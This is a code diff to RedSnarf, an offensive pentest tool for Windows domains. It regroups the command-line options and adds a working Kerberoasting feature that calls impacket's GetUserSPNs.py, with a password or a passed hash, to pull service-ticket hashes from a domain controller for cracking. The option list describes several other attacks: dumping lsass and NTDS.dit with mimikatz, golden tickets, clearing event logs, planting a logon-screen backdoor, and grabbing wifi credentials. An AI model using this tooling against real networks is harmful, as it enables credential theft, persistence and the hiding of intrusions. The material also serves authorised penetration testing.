@@ -1554,7 +1554,7 @@ def main():
 					print colored ("[+]Found " + find_user + " logged in to "+str(ip),'green')
 
 banner()
-p = argparse.ArgumentParser("./redsnarf -H ip=192.168.0.1 -u administrator -p Password1", version="%prog 0.3g", formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=20,width=150))
+p = argparse.ArgumentParser("./redsnarf -H ip=192.168.0.1 -u administrator -p Password1", version="RedSnarf Version 0.3h", formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=20,width=150),description = "Offers a rich set of features to help Pentest Servers and Workstations")
 
 # Creds
 p.add_argument("-H", "--host", dest="host", help="Specify a hostname -H ip= / range -H range= / targets file -H file= to grab hashes from")
@@ -1562,56 +1562,62 @@ p.add_argument("-u", "--username", dest="username", default="Administrator",help
 p.add_argument("-p", "--password", dest="password", default="Password1", help="Enter a password or hash")
 p.add_argument("-d", "--domain_name", dest="domain_name", default=".", help="<Optional> Enter domain name")
 # Configurational 
-p.add_argument("-cQ", "--quick_validate", dest="quick_validate", default="n", help="<Optional> Quickly Validate Credentials")
-p.add_argument("-cC", "--credpath", dest="credpath", default="/opt/creddump7/", help="<Optional> Enter path to creddump7 default /opt/creddump7/")
-p.add_argument("-cO", "--outputpath", dest="outputpath", default="/tmp/", help="<Optional> Enter output path default /tmp/")
-p.add_argument("-cM", "--mergepf", dest="mergepf", default="/tmp/merged.txt", help="<Optional> Enter output path and filename to merge multiple pwdump files default /tmp/merged.txt")
-p.add_argument("-cS", "--skiplsacache", dest="skiplsacache", default="n", help="<Optional> Enter y to skip dumping lsa and cache and go straight to hashes!!")
+cgroup = p.add_argument_group('Configurational')
+cgroup.add_argument("-cC", "--credpath", dest="credpath", default="/opt/creddump7/", help="<Optional> Enter path to creddump7 default /opt/creddump7/")
+cgroup.add_argument("-cM", "--mergepf", dest="mergepf", default="/tmp/merged.txt", help="<Optional> Enter output path and filename to merge multiple pwdump files default /tmp/merged.txt")
+cgroup.add_argument("-cO", "--outputpath", dest="outputpath", default="/tmp/", help="<Optional> Enter output path default /tmp/")
+cgroup.add_argument("-cQ", "--quick_validate", dest="quick_validate", default="n", help="<Optional> Quickly Validate Credentials")
+cgroup.add_argument("-cS", "--skiplsacache", dest="skiplsacache", default="n", help="<Optional> Enter y to skip dumping lsa and cache and go straight to hashes!!")
 # Utilities
-p.add_argument("-uC", "--clear_event", dest="clear_event", default="n", help="<Optional> Clear event log - application, security, setup or system")
-p.add_argument("-uD", "--dropshell", dest="dropshell", default="n", help="<Optional> Enter y to Open up a shell on the remote machine")
-p.add_argument("-uE", "--empire_launcher", dest="empire_launcher", default="n", help="<Optional> Start Empire Launcher")
-p.add_argument("-uG", "--c_password", dest="c_password", default="", help="<Optional> Decrypt GPP Cpassword")
-p.add_argument("-uJ", "--john_to_pipal", dest="john_to_pipal", default="", help="<Optional> Send passwords cracked with JtR to Pipal for Auditing")
-p.add_argument("-uM", "--mssqlshell", dest="mssqlshell", default="", help="<Optional> Start MSSQL Shell use WIN for Windows Auth, DB for MSSQL Auth")
-p.add_argument("-uP", "--policiesscripts_dump", dest="policiesscripts_dump", default="n", help="<Optional> Enter y to Dump Policies and Scripts folder from a Domain Controller")
-p.add_argument("-uR", "--multi_rdp", dest="multi_rdp", default="n", help="<Optional> Enable Multi-RDP with Mimikatz")
-p.add_argument("-uU", "--unattend", dest="unattend", default="n", help="<Optional> Enter y to look for and grap unattended installation files")
-p.add_argument("-uX", "--xcommand", dest="xcommand", default="n", help="<Optional> Run custom command")
-p.add_argument("-uW", "--wifi_credentials", dest="wifi_credentials", default="n", help="<Optional> Grab Wifi Credentials")
+ugroup = p.add_argument_group('Utilities')
+ugroup.add_argument("-uC", "--clear_event", dest="clear_event", default="n", help="<Optional> Clear event log - application, security, setup or system")
+ugroup.add_argument("-uD", "--dropshell", dest="dropshell", default="n", help="<Optional> Enter y to Open up a shell on the remote machine")
+ugroup.add_argument("-uE", "--empire_launcher", dest="empire_launcher", default="n", help="<Optional> Start Empire Launcher")
+ugroup.add_argument("-uG", "--c_password", dest="c_password", default="", help="<Optional> Decrypt GPP Cpassword")
+ugroup.add_argument("-uJ", "--john_to_pipal", dest="john_to_pipal", default="", help="<Optional> Send passwords cracked with JtR to Pipal for Auditing")
+ugroup.add_argument("-uM", "--mssqlshell", dest="mssqlshell", default="", help="<Optional> Start MSSQL Shell use WIN for Windows Auth, DB for MSSQL Auth")
+ugroup.add_argument("-uP", "--policiesscripts_dump", dest="policiesscripts_dump", default="n", help="<Optional> Enter y to Dump Policies and Scripts folder from a Domain Controller")
+ugroup.add_argument("-uR", "--multi_rdp", dest="multi_rdp", default="n", help="<Optional> Enable Multi-RDP with Mimikatz")
+ugroup.add_argument("-uS", "--get_spn", dest="get_spn", default="n", help="<Optional> Get SPN's from DC")
+ugroup.add_argument("-uU", "--unattend", dest="unattend", default="n", help="<Optional> Enter y to look for and grap unattended installation files")
+ugroup.add_argument("-uX", "--xcommand", dest="xcommand", default="n", help="<Optional> Run custom command")
+ugroup.add_argument("-uW", "--wifi_credentials", dest="wifi_credentials", default="n", help="<Optional> Grab Wifi Credentials")
 # Hash related
-p.add_argument("-hN", "--ntds_util", dest="ntds_util", default="", help="<Optional> Extract NTDS.dit using NTDSUtil")
-p.add_argument("-hI", "--drsuapi", dest="drsuapi", default="", help="<Optional> Extract NTDS.dit hashes using drsuapi method - accepts machine name as username")
-p.add_argument("-hQ", "--qldap", dest="qldap", default="", help="<Optional> In conjunction with the -i and -n option - Query LDAP for Account Status when dumping Domain Hashes")
-p.add_argument("-hS", "--credsfile", dest="credsfile", default="", help="Spray multiple hashes at a target range")
-p.add_argument("-hP", "--pass_on_blank", dest="pass_on_blank", default="Password1", help="Password to use when only username found in Creds File")
-p.add_argument("-hK", "--mimikittenz", dest="mimikittenz", default="n", help="<Optional> Run Mimikittenz")
-p.add_argument("-hL", "--lsass_dump", dest="lsass_dump", default="n", help="<Optional> Dump lsass for offline use with mimikatz")
-p.add_argument("-hM", "--massmimi_dump", dest="massmimi_dump", default="n", help="<Optional> Mimikatz Dump Credentaisl from the remote machine(s)")
-p.add_argument("-hR", "--stealth_mimi", dest="stealth_mimi", default="n", help="<Optional> stealth version of mass-mimikatz")
-p.add_argument("-hT", "--golden_ticket", dest="golden_ticket", default="n", help="<Optional> Create a Golden Ticket")
+hgroup = p.add_argument_group('Hash related')
+hgroup.add_argument("-hI", "--drsuapi", dest="drsuapi", default="", help="<Optional> Extract NTDS.dit hashes using drsuapi method - accepts machine name as username")
+hgroup.add_argument("-hN", "--ntds_util", dest="ntds_util", default="", help="<Optional> Extract NTDS.dit using NTDSUtil")
+hgroup.add_argument("-hQ", "--qldap", dest="qldap", default="", help="<Optional> In conjunction with the -i and -n option - Query LDAP for Account Status when dumping Domain Hashes")
+hgroup.add_argument("-hS", "--credsfile", dest="credsfile", default="", help="Spray multiple hashes at a target range")
+hgroup.add_argument("-hP", "--pass_on_blank", dest="pass_on_blank", default="Password1", help="Password to use when only username found in Creds File")
+hgroup.add_argument("-hK", "--mimikittenz", dest="mimikittenz", default="n", help="<Optional> Run Mimikittenz")
+hgroup.add_argument("-hL", "--lsass_dump", dest="lsass_dump", default="n", help="<Optional> Dump lsass for offline use with mimikatz")
+hgroup.add_argument("-hM", "--massmimi_dump", dest="massmimi_dump", default="n", help="<Optional> Mimikatz Dump Credentaisl from the remote machine(s)")
+hgroup.add_argument("-hR", "--stealth_mimi", dest="stealth_mimi", default="n", help="<Optional> stealth version of mass-mimikatz")
+hgroup.add_argument("-hT", "--golden_ticket", dest="golden_ticket", default="n", help="<Optional> Create a Golden Ticket")
 # Enumeration related
-p.add_argument("-eA", "--service_accounts", dest="service_accounts", default="n", help="<Optional> Enum service accounts, if any")
-p.add_argument("-eD", "--user_desc", dest="user_desc", default="n", help="<Optional> Save AD User Description Field to file, check for password")
-p.add_argument("-eL", "--find_user", dest="find_user", default="n", help="<Optional> Find user - Live")
-p.add_argument("-eO", "--ofind_user", dest="ofind_user", default="n", help="<Optional> Find user - Offline")
-p.add_argument("-eP", "--password_policy", dest="password_policy", default="n", help="<Optional> Display Password Policy")
-p.add_argument('--protocols', nargs='*', help=str(SAMRDump.KNOWN_PROTOCOLS.keys()))
-p.add_argument("-eR", "--recorddesktop", dest="recorddesktop", default="n", help="<Optional> Record a desktop using Windows Problem Steps Recorder")
-p.add_argument("-eS", "--screenshot", dest="screenshot", default="n", help="<Optional> Take a screenshot of remote machine desktop")
-p.add_argument("-eT", "--system_tasklist", dest="system_tasklist", default="n", help="<Optional> Display NT AUTHORITY\SYSTEM Tasklist")
+egroup = p.add_argument_group('Enumeration related')
+egroup.add_argument("-eA", "--service_accounts", dest="service_accounts", default="n", help="<Optional> Enum service accounts, if any")
+egroup.add_argument("-eD", "--user_desc", dest="user_desc", default="n", help="<Optional> Save AD User Description Field to file, check for password")
+egroup.add_argument("-eL", "--find_user", dest="find_user", default="n", help="<Optional> Find user - Live")
+egroup.add_argument("-eO", "--ofind_user", dest="ofind_user", default="n", help="<Optional> Find user - Offline")
+egroup.add_argument("-eP", "--password_policy", dest="password_policy", default="n", help="<Optional> Display Password Policy")
+egroup.add_argument('--protocols', nargs='*', help=str(SAMRDump.KNOWN_PROTOCOLS.keys()))
+egroup.add_argument("-eR", "--recorddesktop", dest="recorddesktop", default="n", help="<Optional> Record a desktop using Windows Problem Steps Recorder")
+egroup.add_argument("-eS", "--screenshot", dest="screenshot", default="n", help="<Optional> Take a screenshot of remote machine desktop")
+egroup.add_argument("-eT", "--system_tasklist", dest="system_tasklist", default="n", help="<Optional> Display NT AUTHORITY\SYSTEM Tasklist")
 # Registry related
-p.add_argument("-rL", "--lat", dest="lat", default="n", help="<Optional> Write batch file for turning on/off Local Account Token Filter Policy")
-p.add_argument("-rR", "--edq_rdp", dest="edq_rdp", default="n", help="<Optional> (E)nable/(D)isable/(Q)uery RDP Status")
-p.add_argument("-rN", "--edq_nla", dest="edq_nla", default="n", help="<Optional> (E)nable/(D)isable/(Q)uery NLA Status")
-p.add_argument("-rT", "--edq_trdp", dest="edq_trdp", default="n", help="<Optional> (E)nable/(D)isable/(Q)uery Tunnel RDP out of port 443")
-p.add_argument("-rW", "--edq_wdigest", dest="edq_wdigest", default="n", help="<Optional> (E)nable/(D)isable/(Q)uery Wdigest UseLogonCredential Registry Setting")
-p.add_argument("-rB", "--edq_backdoor", dest="edq_backdoor", default="n", help="<Optional> (E)nable/(D)isable/(Q)uery Backdoor Registry Setting - Left Alt + Left Shift + Print Screen at Logon Screen")
-p.add_argument("-rU", "--edq_uac", dest="edq_uac", default="n", help="<Optional> (E)nable/(D)isable/(Q)uery UAC Registry Setting")
-p.add_argument("-rA", "--edq_autologon", dest="edq_autologon", default="n", help="<Optional> (E)nable/(D)isable/(Q)uery AutoLogon Registry Setting")
-p.add_argument("-rS", "--edq_allowtgtsessionkey", dest="edq_allowtgtsessionkey", default="n", help="<Optional> (E)nable/(D)isable/(Q)uery allowtgtsessionkey Registry Setting")
-p.add_argument("-rM", "--edq_SingleSessionPerUser", dest="edq_SingleSessionPerUser", default="n", help="<Optional> (E)nable/(D)isable/(Q)uery RDP SingleSessionPerUser Registry Setting")
-p.add_argument("-rC", "--edq_scforceoption", dest="edq_scforceoption", default="n", help="<Optional> (E)nable/(D)isable/(Q)uery Smart Card scforceoption Registry Setting")
+rgroup = p.add_argument_group('Registry related')
+rgroup.add_argument("-rA", "--edq_autologon", dest="edq_autologon", default="n", help="<Optional> (E)nable/(D)isable/(Q)uery AutoLogon Registry Setting")
+rgroup.add_argument("-rB", "--edq_backdoor", dest="edq_backdoor", default="n", help="<Optional> (E)nable/(D)isable/(Q)uery Backdoor Registry Setting - Left Alt + Left Shift + Print Screen at Logon Screen")
+rgroup.add_argument("-rC", "--edq_scforceoption", dest="edq_scforceoption", default="n", help="<Optional> (E)nable/(D)isable/(Q)uery Smart Card scforceoption Registry Setting")
+rgroup.add_argument("-rL", "--lat", dest="lat", default="n", help="<Optional> Write batch file for turning on/off Local Account Token Filter Policy")
+rgroup.add_argument("-rM", "--edq_SingleSessionPerUser", dest="edq_SingleSessionPerUser", default="n", help="<Optional> (E)nable/(D)isable/(Q)uery RDP SingleSessionPerUser Registry Setting")
+rgroup.add_argument("-rN", "--edq_nla", dest="edq_nla", default="n", help="<Optional> (E)nable/(D)isable/(Q)uery NLA Status")
+rgroup.add_argument("-rR", "--edq_rdp", dest="edq_rdp", default="n", help="<Optional> (E)nable/(D)isable/(Q)uery RDP Status")
+rgroup.add_argument("-rS", "--edq_allowtgtsessionkey", dest="edq_allowtgtsessionkey", default="n", help="<Optional> (E)nable/(D)isable/(Q)uery allowtgtsessionkey Registry Setting")
+rgroup.add_argument("-rT", "--edq_trdp", dest="edq_trdp", default="n", help="<Optional> (E)nable/(D)isable/(Q)uery Tunnel RDP out of port 443")
+rgroup.add_argument("-rU", "--edq_uac", dest="edq_uac", default="n", help="<Optional> (E)nable/(D)isable/(Q)uery UAC Registry Setting")
+rgroup.add_argument("-rW", "--edq_wdigest", dest="edq_wdigest", default="n", help="<Optional> (E)nable/(D)isable/(Q)uery Wdigest UseLogonCredential Registry Setting")
 
 args = p.parse_args()
 
@@ -1664,6 +1670,7 @@ empire_launcher=args.empire_launcher
 mssqlshell=args.mssqlshell
 wifi_credentials=args.wifi_credentials
 john_to_pipal=args.john_to_pipal
+get_spn=args.get_spn
 
 #Code takes a hash file which has previously been seen by Jtr, cuts out the cracked passwords, gets rid of any blank lines, gets rid of the last line, outputs to a tmp file
 #in the tmp directory. Runs pipal against the tmp file and then pipes out the pipal data to file.
@@ -1718,6 +1725,73 @@ elif remotetargets[0:6]=='range=':
 		
 	for remotetarget in IPNetwork(remotetargets[6:len(remotetargets)]):
 		targets.append (remotetarget);
+
+if get_spn in yesanswers or get_spn=="l":
+	if len(targets)==1:
+		try:
+			#Get SPN's from DC
+			print colored("[+]Trying to get SPN's from DC",'yellow')
+			
+			#Confirm that remote IP is a DC (Check port 88 Kerberos is Open)
+			checkport()
+
+			#Check that GetUserSPN's is installed
+			if not os.path.isfile('/usr/local/bin/GetUserSPNs.py'):
+				print colored("[-]No GetUserSPNs.py",'red')
+				print colored("[-]Clone from https://github.com/CoreSecurity/impacket.git",'yellow')
+				print colored("[-]and run: python setup.py install",'yellow')
+				exit(1)				
+			else:
+				print colored("[+]Found GetUserSPNs.py installed",'green')			
+			
+			#Check that pyasn1-0.18 is installed - (seems to be version sensitive)
+			if not os.path.isfile('/usr/local/lib/python2.7/dist-packages/pyasn1-0.1.8-py2.7.egg'):
+				print colored("[-]No pyasn1-0.1.8",'red')
+				print colored("[-]Download and install from https://pypi.python.org/pypi/pyasn1/0.1.8#downloads",'yellow')
+				print colored("[-]and run: python setup.py install",'yellow')
+				exit(1)				
+			else:
+				print colored("[+]Found pyasn1-0.1.8 installed",'green')			
+
+			print colored("[+]Configuration OK...",'yellow')
+			print colored("[+]Note - to crack the extracted hashes with JtR, JtR Jumbo Patch is needed",'blue')
+			print colored("[+]which can be cloned from https://github.com/magnumripper/JohnTheRipper.git",'blue')
+			
+			if domain_name==".":
+				print colored("[-]You must enter a domain - e.g. ecorp.local",'red')
+				exit(1)		
+
+			#Check to see whether the supplied password is a hash or not
+			pwdumpmatch = re.compile('^([0-9a-fA-F]{32}):([0-9a-fA-F]{32}):.*?:.*?:\s*$')
+			pwdump = pwdumpmatch.match(passw)
+			
+			if pwdump:
+				passw=passw[0:-3]
+			
+			if pwdump:
+				proc = subprocess.Popen("GetUserSPNs.py -hashes "+passw+' '+domain_name+'/'+user+' -dc-ip '+targets[0] +" -request -outputfile "+outputpath+targets[0]+"/spns.txt", stdout=subprocess.PIPE,shell=True)
+				stdout_value = proc.communicate()[0]
+			else:
+				proc = subprocess.Popen("GetUserSPNs.py "+domain_name+'/'+user+':'+passw+' -dc-ip '+targets[0] +" -request -outputfile "+outputpath+targets[0]+"/spns.txt", stdout=subprocess.PIPE,shell=True)
+				stdout_value = proc.communicate()[0]
+			
+			if "No entries found!" in stdout_value:
+				print colored("[-]No SPN entries were found!",'red')
+				sys.exit()
+
+			if not os.path.isfile(outputpath+targets[0]+"/spns.txt"):
+				print colored("[-]No SPNS's were output",'red')
+			else:
+				print colored("[-]SPN's output to "+outputpath+targets[0]+"/spns.txt",'green')
+
+			sys.exit()
+			
+		except OSError:
+			print colored("[-]Something went wrong getting SPN's from DC",'red')
+	else:
+		print colored ('\n[-]It is only possible to use this technique on a single target and not a range','red')
+		sys.exit()
+
 
 if wifi_credentials in yesanswers:
 	if len(targets)==1:
